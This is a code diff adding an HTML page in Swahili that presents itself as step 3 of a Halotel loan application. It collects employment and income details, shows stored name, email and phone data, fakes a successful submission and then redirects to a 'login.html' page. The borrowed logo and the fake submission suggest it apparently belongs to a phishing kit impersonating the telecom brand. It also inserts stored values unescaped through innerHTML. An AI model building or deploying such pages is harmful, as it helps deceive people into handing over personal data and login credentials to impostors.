@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="sw">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halotel - Ombi la Mkopo</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+        
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+        }
+        
+        .logo-img {
+            height: 35px;
+            object-fit: contain;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 480px;
+            height: calc(100vh - 100px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        
+        .top {
+            text-align: left;
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: 20px;
+        }
+        
+        .form-title {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+            color: #333;
+        }
+        
+        .progress-bar {
+            width: 160px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 20px auto;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to right, #ff6600, #e05500);
+        }
+        
+        .step-text {
+            color: #777;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .form-label {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 15px;
+            display: block;
+        }
+        
+        .form-select,
+        .form-input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            margin-bottom: 16px;
+        }
+        
+        .form-select:focus,
+        .form-input:focus {
+            border-color: #ff6600;
+            outline: none;
+        }
+        
+        .summary-box {
+            background: #fff8f3;
+            border: 1px solid #ffe0cc;
+            padding: 16px;
+            border-radius: 16px;
+            font-size: 14px;
+        }
+        
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            color: #555;
+        }
+        
+        .summary-value {
+            font-weight: 600;
+            color: #333;
+            text-align: right;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .prev-btn,
+        .submit-btn {
+            flex: 1;
+            padding: 16px;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        
+        .prev-btn {
+            background: #eee;
+            color: #666;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(to right, #ff6600, #e05500);
+            color: white;
+            position: relative;
+        }
+        
+        footer {
+            padding: 20px;
+            color: #aaa;
+            font-size: 13px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+        }
+        /* Spinner Overlay */
+        
+        #spinnerOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 102, 0, 0.15);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f0f0f0;
+            border-top: 6px solid #ff6600;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        /* Success Overlay */
+        
+        #successOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .success-card {
+            background: white;
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
+        }
+        
+        .check-icon {
+            width: 80px;
+            height: 80px;
+            background: #ff6600;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 30px;
+            font-size: 48px;
+            color: white;
+        }
+        
+        .success-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ff6600;
+            margin-bottom: 15px;
+        }
+        
+        .success-msg {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        
+        .redirect-bar {
+            background: #f0f0f0;
+            padding: 14px;
+            border-radius: 50px;
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .redirect-bar .loader {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #ff6600;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        .go-login-btn {
+            width: 100%;
+            padding: 16px;
+            background: #ff6600;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <button class="back-btn" onclick="history.back()">←</button>
+        <img class="logo-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGt3VB_WtrYNUD0gcLSejZvKr1J2IOTeQJwRAbtZLR5w&s=10" alt="Halotel Logo">
+        <div></div>
+    </header>
+
+    <main class="card">
+        <div class="top">
+            <h1 class="form-title">Tathmini ya Mwisho</h1>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="step-text">Hatua ya 3 kati ya 3</div>
+
+            <label class="form-label">Aina ya Ajira</label>
+            <select class="form-select" id="employmentStatus">
+                <option>Ameajiriwa</option>
+                <option>Amejitengenezea Ajira</option>
+                <option>Hana Ajira</option>
+                <option>Mwanafunzi</option>
+            </select>
+
+            <label class="form-label">Pato la Mwaka (TSh)</label>
+            <input type="number" class="form-input" id="annualIncome" placeholder="5,000,000">
+
+            <div class="summary-box" id="summaryBox">
+                <!-- Filled dynamically by JavaScript -->
+            </div>
+        </div>
+
+        <div class="btn-group">
+            <button class="prev-btn" onclick="history.back()">ILOYOPITA</button>
+            <button class="submit-btn" id="submitBtn">TUMA OMBI LA MKOPO</button>
+        </div>
+    </main>
+
+    <footer>© 2025 Halotel</footer>
+
+    <!-- Spinner Overlay -->
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Success Overlay -->
+    <div id="successOverlay">
+        <div class="success-card">
+            <div class="check-icon">✓</div>
+            <div class="success-title">Ombi Limesilishwa Kwa Mafanikio</div>
+            <div class="success-msg">
+                Ombi lako la mkopo limetumwa kikamilifu. Tafadhali subiri uhakiki.<br><br> Utapokea ujumbe wa uthibitisho. Kwa sasa, endelea kwenye Halotel.
+            </div>
+            <div class="redirect-bar">
+                <div class="loader"></div>
+                Inaelekeza kwenye ukurasa wa kuingia wa Halotel baada ya sekunde <span id="countdown">3</span>...
+            </div>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">Nenda Kwenye Kuingia Sasa</button>
+        </div>
+    </div>
+
+    <script>
+        const summaryBox = document.getElementById('summaryBox');
+        summaryBox.innerHTML = `
+            <div class="summary-row"><span>Aina ya Mkopo:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Mkopo Bafsi'}</span></div>
+            <div class="summary-row"><span>Kiasi:</span><span class="summary-value">TSh ${parseFloat(localStorage.getItem('loanAmount') || 1000000).toLocaleString()}</span></div>
+            <div class="summary-row"><span>Muda:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Miezi</span></div>
+            <div class="summary-row"><span>Dhumuni:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Haijaainishwa'}</span></div>
+            <div class="summary-row"><span>Jina:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+            <div class="summary-row"><span>Barua Pepe:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
+            <div class="summary-row"><span>Simu:</span><span class="summary-value">+255 ${localStorage.getItem('phone') || 'N/A'}</span></div>
+        `;
+
+        if (localStorage.getItem('employmentStatus')) {
+            document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
+        }
+        if (localStorage.getItem('annualIncome')) {
+            document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
+        }
+
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const income = document.getElementById('annualIncome').value.trim();
+            if (!income || income < 100000) {
+                alert('Tafadhali ingiza pato la mwaka linalokubalika (angalau TSh 100,000).');
+                return;
+            }
+
+            localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
+            localStorage.setItem('annualIncome', income);
+
+            // Show orange spinner overlay for 3 seconds
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            spinnerOverlay.style.display = 'flex';
+
+            setTimeout(() => {
+                spinnerOverlay.style.display = 'none';
+                const successOverlay = document.getElementById('successOverlay');
+                successOverlay.style.display = 'flex';
+
+                // Countdown 3 seconds then auto redirect
+                let seconds = 3;
+                const countdownEl = document.getElementById('countdown');
+                const timer = setInterval(() => {
+                    seconds--;
+                    countdownEl.textContent = seconds;
+                    if (seconds <= 0) {
+                        clearInterval(timer);
+                        window.location.href = 'login.html';
+                    }
+                }, 1000);
+            }, 3000);
+        });
+    </script>
+</body>
+
+</html>
